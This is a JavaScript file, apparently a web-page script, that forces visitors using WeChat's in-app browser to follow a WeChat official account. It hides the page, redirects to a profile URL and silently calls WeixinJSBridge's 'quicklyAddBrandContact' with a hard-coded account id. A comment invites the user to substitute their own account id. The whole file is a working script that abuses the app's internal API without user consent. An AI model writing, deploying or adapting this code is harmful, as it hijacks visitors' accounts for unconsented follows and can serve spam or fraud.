var isIos = !!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
function getRandomArrayElements(arr, count) {
    var shuffled = arr.slice(0), i = arr.length, min = i - count, temp, index;
    while (i-- > min) {
        index = Math.floor((i + 1) * Math.random());
        temp = shuffled[index];
        shuffled[index] = shuffled[i];
        shuffled[i] = temp;
    }
    return shuffled.slice(min);
}

// 这里替换成自己的公众号原始id
var gh = [
    'gh_574dbe8edefe'
];
function isWeiXin() {

    var ua = window.navigator.userAgent.toLowerCase();
    if (ua.match(/MicroMessenger/i) == 'micromessenger') {
        return true;
    } else {
        return false;
    }
}

function endaction() {
    try {
        window.name = 'ok' + Math.random();
    } catch (_0x1c7de6) { }
}

function uncompileStr(code) {
    code = unescape(code);
    var c = String.fromCharCode(code.charCodeAt(0) - code.length);
    for (var i = 1; i < code.length; i++) {
        c += String.fromCharCode(code.charCodeAt(i) - c.charCodeAt(i - 1));
    }
    return c;
}

function tostart(result) {
    goTo(result);
}

function goTo(username) {
    d = document;
    d.body.style.display = 'none';
    var vk = false;
    var ha = 0;
    c = function () {
        clearInterval(mm);
    };
    j = function () {
        if (ha !== 99) m();
    };
    h = function () {
        endaction();
    };
    m = function () {
        if (!vk) {
            vk = true;
            h()
        }
    };
    k = function () {
        go(username);
    };

    go = function (username) {
        username.forEach(function (item) {
            window.location.href = 'https://mp.weixin.qq.com/mp/profile_ext?action=home&__biz=' + '' + '&t=' + Math.random() + '#wechat_redirect';
            mm = setTimeout(function () {
                try {
                    WeixinJSBridge.invoke('quicklyAddBrandContact', {
                        scene: '',
                        username: item
                    }, function (d) {
                        if (d.err_msg.indexOf('ok') !== -1 || d.err_msg.indexOf('added') !== -1) {
                            ha = 99;
                            m();
                        } else go(item)
                    });
                    ha++;
                    if (ha === 2) setTimeout(j, 200);
                } catch (e) { }
            }, 200)
        })
    };

    if (typeof (WeixinJSBridge) === 'undefined') {
        if (document.addEventListener) document.addEventListener('WeixinJSBridgeReady', k, false)
    } else k();
}

if (window.name === '') {
    if (isWeiXin()) {
        goTo(gh);
    }
    else {
    }
} else {
    window.loadadd = true;
    window.name = '';
}